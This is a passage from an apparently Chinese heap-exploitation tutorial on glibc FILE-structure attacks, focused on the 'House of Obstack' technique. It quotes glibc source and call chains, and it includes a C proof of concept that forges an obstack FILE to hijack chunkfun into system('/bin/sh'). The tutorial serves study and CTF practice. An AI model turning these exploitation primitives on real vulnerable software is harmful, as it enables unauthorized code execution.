<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">wint_t</span></span><br><span class="line">_IO_wfile_sync (FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">ssize_t</span> delta;</span><br><span class="line">  <span class="type">wint_t</span> retval = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/*    char* ptr = cur_ptr(); */</span></span><br><span class="line">  <span class="comment">// 不要进入这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">    <span class="keyword">if</span> (_IO_do_flush (fp))</span><br><span class="line">      <span class="keyword">return</span> WEOF;</span><br><span class="line">  delta = fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end;</span><br><span class="line">  <span class="comment">// 需要进入到这个分支</span></span><br><span class="line">  <span class="keyword">if</span> (delta != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We have to find out how many bytes we have to go back in the</span></span><br><span class="line"><span class="comment">     external buffer.  */</span></span><br><span class="line">      <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *<span class="title">cv</span> =</span> fp-&gt;_codecvt;</span><br><span class="line">      <span class="type">off64_t</span> new_pos;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">// 这里直接返回-1即可</span></span><br><span class="line">      <span class="type">int</span> clen = __libio_codecvt_encoding (cv);</span><br><span class="line"> </span><br><span class="line">      <span class="keyword">if</span> (clen &gt; <span class="number">0</span>)</span><br><span class="line">    <span class="comment">/* It is easy, a fixed number of input bytes are used for each</span></span><br><span class="line"><span class="comment">       wide character.  */</span></span><br><span class="line">    delta *= clen;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We have to find out the hard way how much to back off.</span></span><br><span class="line"><span class="comment">         To do this we determine how much input we needed to</span></span><br><span class="line"><span class="comment">         generate the wide characters up to the current reading</span></span><br><span class="line"><span class="comment">         position.  */</span></span><br><span class="line">      <span class="type">int</span> nread;</span><br><span class="line">      <span class="type">size_t</span> wnread = (fp-&gt;_wide_data-&gt;_IO_read_ptr</span><br><span class="line">               - fp-&gt;_wide_data-&gt;_IO_read_base);</span><br><span class="line">      fp-&gt;_wide_data-&gt;_IO_state = fp-&gt;_wide_data-&gt;_IO_last_state;</span><br><span class="line">    <span class="comment">// 调用到这里</span></span><br><span class="line">      nread = __libio_codecvt_length (cv, &amp;fp-&gt;_wide_data-&gt;_IO_state,</span><br><span class="line">                      fp-&gt;_IO_read_base,</span><br><span class="line">                      fp-&gt;_IO_read_end, wnread);</span><br><span class="line">            <span class="comment">// ......</span></span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>需要设置<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &lt;= fp-&gt;_wide_data-&gt;_IO_write_base</code>和<code>fp-&gt;_wide_data-&gt;_IO_read_ptr - fp-&gt;_wide_data-&gt;_IO_read_end != 0</code>。</p>
<p>然后看下<code>__libio_codecvt_encoding</code>函数：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__libio_codecvt_encoding (<span class="keyword">struct</span> _IO_codecvt *codecvt)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* See whether the encoding is stateful.  */</span></span><br><span class="line">  <span class="keyword">if</span> (codecvt-&gt;__cd_in.step-&gt;__stateful)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="comment">/* Fortunately not.  Now determine the input bytes for the conversion</span></span><br><span class="line"><span class="comment">     necessary for each wide character.  */</span></span><br><span class="line">  <span class="keyword">if</span> (codecvt-&gt;__cd_in.step-&gt;__min_needed_from</span><br><span class="line">      != codecvt-&gt;__cd_in.step-&gt;__max_needed_from)</span><br><span class="line">    <span class="comment">/* Not a constant value.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> codecvt-&gt;__cd_in.step-&gt;__min_needed_from;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>直接设置<code>fp-&gt;codecvt-&gt;__cd_in.step-&gt;__stateful != 0</code>即可返回<code>-1</code>。</p>
<h2 id="House-of-琴瑟琵琶-House-of-Obstack"><a href="#House-of-琴瑟琵琶-House-of-Obstack" class="headerlink" title="House of 琴瑟琵琶 | House of Obstack"></a>House of 琴瑟琵琶 | House of Obstack</h2><p>这个攻击手段主要是利用<code>_IO_obstack_jumps</code>，其中<code>_IO_obstack_overflow</code>和 <code>_IO_obstack_xsputn</code> 都可以触发，攻击链如下。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_obstack_overflow</span><br><span class="line">        <span class="title function_">obstack_1grow</span> <span class="params">(obstack, c)</span>;</span><br><span class="line">                _obstack_newchunk (__o, <span class="number">1</span>);   </span><br><span class="line">                         new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">                                     (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">_IO_obstack_xsputn</span><br><span class="line">        <span class="title function_">obstack_grow</span> <span class="params">(obstack, data, n)</span>;;</span><br><span class="line">                _obstack_newchunk (__o, __len);</span><br><span class="line">                         new_chunk = CALL_CHUNKFUN (h, new_size);</span><br><span class="line">                                     (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</span><br></pre></td></tr></table></figure></div>

<p>但实际过程中<code>_IO_obstack_overflow</code>容易触发<code>assert (c != EOF);</code> ，所以一般选择第二条链。</p>
<p><code>_IO_obstack_jumps</code>中只有2个函数有赋值，其他都为空。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* the jump table.  */</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_obstack_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(overflow, _IO_obstack_overflow),</span><br><span class="line">  JUMP_INIT(underflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(uflow, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(pbackfail, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_obstack_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekoff, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seekpos, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(setbuf, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(sync, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(doallocate, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(read, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(write, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(seek, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(close, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(stat, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(showmanyc, <span class="literal">NULL</span>),</span><br><span class="line">  JUMP_INIT(imbue, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><code>_IO_obstack_overflow</code>和<code>_IO_obstack_xsputn</code>两个函数内容如下。为了避免绕过<code>_IO_obstack_overflow</code>中的<code>assert (c != EOF);</code> ，<strong>我们一般用<code>_IO_obstack_xsputn</code>。</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> _IO_obstack_overflow (FILE *fp, <span class="type">int</span> c)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((<span class="keyword">struct</span> _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line">  <span class="type">int</span> size;</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Make room for another character.  This might as well allocate a</span></span><br><span class="line"><span class="comment">     new chunk a memory and moves the old contents over.  */</span></span><br><span class="line">  assert (c != EOF);  <span class="comment">// 此处不可控</span></span><br><span class="line">  obstack_1grow (obstack, c);</span><br><span class="line"> </span><br><span class="line">  <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">  fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">  fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">  size = obstack_room (obstack);</span><br><span class="line">  fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">  <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">  obstack_blank_fast (obstack, size);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> c;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">size_t</span> _IO_obstack_xsputn (FILE *fp, <span class="type">const</span> <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span> =</span> ((<span class="keyword">struct</span> _IO_obstack_file *) fp)-&gt;obstack;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_write_ptr + n &gt; fp-&gt;_IO_write_end)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> size;</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* We need some more memory.  First shrink the buffer to the</span></span><br><span class="line"><span class="comment">     space we really currently need.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, fp-&gt;_IO_write_ptr - fp-&gt;_IO_write_end);</span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Now grow for N bytes, and put the data there.  */</span></span><br><span class="line">      obstack_grow (obstack, data, n); <span class="comment">//执行此函数</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Setup the buffer pointers again.  */</span></span><br><span class="line">      fp-&gt;_IO_write_base = obstack_base (obstack);</span><br><span class="line">      fp-&gt;_IO_write_ptr = obstack_next_free (obstack);</span><br><span class="line">      size = obstack_room (obstack);</span><br><span class="line">      fp-&gt;_IO_write_end = fp-&gt;_IO_write_ptr + size;</span><br><span class="line">      <span class="comment">/* Now allocate the rest of the current chunk.  */</span></span><br><span class="line">      obstack_blank_fast (obstack, size);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    fp-&gt;_IO_write_ptr = __mempcpy (fp-&gt;_IO_write_ptr, data, n);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>函数中的<code>_IO_obstack_file</code>只是在<code>_IO_FILE_plus</code>后面加了一个<code>obstack</code>的指针。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_obstack_file</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">file</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">obstack</span> *<span class="title">obstack</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">obstack</span>          /* <span class="title">control</span> <span class="title">current</span> <span class="title">object</span> <span class="title">in</span> <span class="title">current</span> <span class="title">chunk</span> */</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">long</span> chunk_size;              <span class="comment">/* preferred size to allocate chunks in */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">chunk</span>;</span> <span class="comment">/* address of current struct obstack_chunk */</span></span><br><span class="line">  <span class="type">char</span> *object_base;            <span class="comment">/* address of object we are building */</span></span><br><span class="line">  <span class="type">char</span> *next_free;              <span class="comment">/* where to add next char to current object */</span></span><br><span class="line">  <span class="type">char</span> *chunk_limit;            <span class="comment">/* address of char after current chunk */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    PTR_INT_TYPE tempint;</span><br><span class="line">    <span class="type">void</span> *tempptr;</span><br><span class="line">  &#125; temp;                       <span class="comment">/* Temporary for some macros.  */</span></span><br><span class="line">  <span class="type">int</span> alignment_mask;           <span class="comment">/* Mask of alignment for each object. */</span></span><br><span class="line">  <span class="comment">/* These prototypes vary based on &#x27;use_extra_arg&#x27;, and we use</span></span><br><span class="line"><span class="comment">     casts to the prototypeless function type in all assignments,</span></span><br><span class="line"><span class="comment">     but having prototypes here quiets -Wstrict-prototypes.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *(*<span class="title">chunkfun</span>) (<span class="title">void</span> *, <span class="title">long</span>);</span></span><br><span class="line">  <span class="type">void</span> (*freefun) (<span class="type">void</span> *, <span class="keyword">struct</span> _obstack_chunk *);</span><br><span class="line">  <span class="type">void</span> *extra_arg;              <span class="comment">/* first arg for chunk alloc/dealloc funcs */</span></span><br><span class="line">  <span class="type">unsigned</span> use_extra_arg : <span class="number">1</span>;     <span class="comment">/* chunk alloc/dealloc funcs take extra arg */</span></span><br><span class="line">  <span class="type">unsigned</span> maybe_empty_object : <span class="number">1</span>; <span class="comment">/* There is a possibility that the current</span></span><br><span class="line"><span class="comment">                      chunk contains a zero-length object.  This</span></span><br><span class="line"><span class="comment">                      prevents freeing the chunk if we allocate</span></span><br><span class="line"><span class="comment">                      a bigger chunk to replace it. */</span></span><br><span class="line">  <span class="type">unsigned</span> alloc_failed : <span class="number">1</span>;      <span class="comment">/* No longer used, as we now call the failed</span></span><br><span class="line"><span class="comment">                     handler on error, but retained for binary</span></span><br><span class="line"><span class="comment">                     compatibility.  */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>简单绕过一些内容后用运行到<code>obstack_grow</code>处，来调用<code>_obstack_newchunk</code>。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">        obstack_grow(obstack, data, n);</span><br><span class="line">定义:  </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> obstack_grow(OBSTACK, where, length)				      \</span></span><br><span class="line"><span class="meta">  __extension__								      \</span></span><br><span class="line"><span class="meta">    (&#123; struct obstack *__o = (OBSTACK);					      \</span></span><br><span class="line"><span class="meta">       int __len = (length);						      \</span></span><br><span class="line"><span class="meta">       <span class="keyword">if</span> (__o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)			      \</span></span><br><span class="line"><span class="meta">	 _obstack_newchunk (__o, __len);				      \</span></span><br><span class="line"><span class="meta">       memcpy (__o-&gt;next_free, where, __len);				      \</span></span><br><span class="line"><span class="meta">       __o-&gt;next_free += __len;						      \</span></span><br><span class="line"><span class="meta">       (void) 0; &#125;)</span></span><br><span class="line"> 替换:  </span><br><span class="line">        (&#123;</span><br><span class="line">            <span class="keyword">struct</span> obstack *__o = (obstack);</span><br><span class="line">            <span class="type">int</span> __len = (n);</span><br><span class="line">            <span class="keyword">if</span> (__o-&gt;next_free + __len &gt; __o-&gt;chunk_limit)_obstack_newchunk(__o, __len);</span><br><span class="line">            <span class="built_in">memcpy</span>(__o-&gt;next_free, data, __len);</span><br><span class="line">            __o-&gt;next_free += __len;</span><br><span class="line">            (<span class="type">void</span>) <span class="number">0</span>;</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure></div>

<p>之后触发<code>CALL_CHUNKFUN</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _obstack_newchunk(<span class="keyword">struct</span> obstack *h, <span class="type">int</span> length) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">old_chunk</span> =</span> h-&gt;chunk;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">obstack_chunk</span> *<span class="title">new_chunk</span>;</span></span><br><span class="line">    <span class="type">long</span> new_size;</span><br><span class="line">    <span class="type">long</span> obj_size = h-&gt;next_free - h-&gt;object_base;</span><br><span class="line">    <span class="type">long</span> i;</span><br><span class="line">    <span class="type">long</span> already;</span><br><span class="line">    <span class="type">char</span> *object_base;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Compute size for new chunk.  */</span></span><br><span class="line">    new_size = (obj_size + length) + (obj_size &gt;&gt; <span class="number">3</span>) + h-&gt;alignment_mask + <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">if</span> (new_size &lt; h-&gt;chunk_size)</span><br><span class="line">        new_size = h-&gt;chunk_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Allocate and initialize the new chunk.  */</span></span><br><span class="line">    new_chunk = CALL_CHUNKFUN(h, new_size); <span class="comment">// 调用函数位置</span></span><br><span class="line">    ...</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p><code>CALL_CHUNKFUN</code>宏实际上是使用了结构体中的指针<code>(*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size))</code>，并且第一个参数可控，同时需要保证<code>(((h)-&gt;use_extra_arg)</code>为1</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">new_chunk = CALL_CHUNKFUN(h, new_size);</span><br><span class="line">定义:  </span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CALL_CHUNKFUN(h, size)                          \</span></span><br><span class="line"><span class="meta">    (((h)-&gt;use_extra_arg)                               \</span></span><br><span class="line"><span class="meta">             ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (size)) \</span></span><br><span class="line"><span class="meta">             : (*(struct _obstack_chunk * (*) (long) )(h)-&gt;chunkfun)((size)))</span></span><br><span class="line">替换:  </span><br><span class="line">(((h)-&gt;use_extra_arg) ? (*(h)-&gt;chunkfun)((h)-&gt;extra_arg, (new_size)) : (*(<span class="keyword">struct</span> _obstack_chunk *(*) (<span class="type">long</span>) )(h)-&gt;chunkfun)((new_size)))</span><br></pre></td></tr></table></figure></div>

<p>因此可以按下图所示方法构造：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/f2d3f8634e9f15a5b53e2cea36f32bc8.png"
                     
                ><br><a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_qspp" >poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> 如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">//leak libc_base</span></span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>) &amp;<span class="built_in">puts</span>;</span><br><span class="line">    <span class="type">size_t</span> libc_base = puts_addr - <span class="number">0x77040</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// large bin attack: _IO_list_all -&gt; large</span></span><br><span class="line">    <span class="type">size_t</span> IO_list_all_addr = libc_base + <span class="number">0x1d2660</span>;</span><br><span class="line">    <span class="type">size_t</span> *large = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x18</span>);</span><br><span class="line">    <span class="type">size_t</span> *unsorted = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line">    <span class="built_in">free</span>(large);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">free</span>(unsorted);</span><br><span class="line">    large[<span class="number">3</span>] = IO_list_all_addr - <span class="number">0x20</span>;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> *fake_IO_obstack_file = large - <span class="number">2</span>;</span><br><span class="line">    <span class="type">size_t</span> *fake_obstack = fake_IO_obstack_file + <span class="number">6</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> IO_obstack_jumps = libc_base + <span class="number">0x1ce420</span>;</span><br><span class="line"></span><br><span class="line">    fake_IO_obstack_file[<span class="number">4</span>] = <span class="number">0</span>;                       <span class="comment">// _IO_write_base</span></span><br><span class="line">    fake_IO_obstack_file[<span class="number">5</span>] = <span class="number">1</span>;                       <span class="comment">// _IO_write_ptr</span></span><br><span class="line">    fake_IO_obstack_file[<span class="number">27</span>] = IO_obstack_jumps + <span class="number">0x20</span>;<span class="comment">// vtable</span></span><br><span class="line">    fake_IO_obstack_file[<span class="number">28</span>] = (<span class="type">size_t</span>) fake_obstack;  <span class="comment">//obstack</span></span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="type">char</span> *) &amp;fake_IO_obstack_file[<span class="number">29</span>], <span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fake_obstack[<span class="number">7</span>] = (<span class="type">size_t</span>) system;                   <span class="comment">//chunkfun -&gt; system</span></span><br><span class="line">    fake_obstack[<span class="number">9</span>] = (<span class="type">size_t</span>) &amp;fake_IO_obstack_file[<span class="number">29</span>];<span class="comment">//extra_arg -&gt; &quot;/bin/sh&quot;</span></span><br><span class="line">    fake_obstack[<span class="number">10</span>] |= <span class="number">1</span>;                               <span class="comment">//use_extra_arg = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// FSOP</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>攻击模板如下：</p>
